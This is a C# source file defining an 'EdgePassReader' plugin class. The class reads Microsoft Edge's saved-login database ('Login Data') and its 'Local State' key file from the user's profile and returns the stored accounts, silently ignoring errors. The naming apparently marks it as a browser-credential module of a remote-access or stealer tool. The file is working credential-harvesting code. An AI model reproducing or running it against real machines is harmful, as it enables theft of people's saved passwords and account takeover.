

using InvokedCommon.Models;
using System;
using System.Collections.Generic;
using System.IO;


namespace Plugin.Helper.Browsers
{
	public class EdgePassReader : ChromiumBase
	{
		public override string ApplicationName => "Microsoft Edge";

		public override IEnumerable<RecoveredAccount> ReadAccounts()
		{
			try
			{
				return (IEnumerable<RecoveredAccount>) this.ReadAccounts(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Default\\Login Data"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Local State"));
			}
			catch (Exception ex)
			{
				return (IEnumerable<RecoveredAccount>) new List<RecoveredAccount>();
			}
		}
	}
}
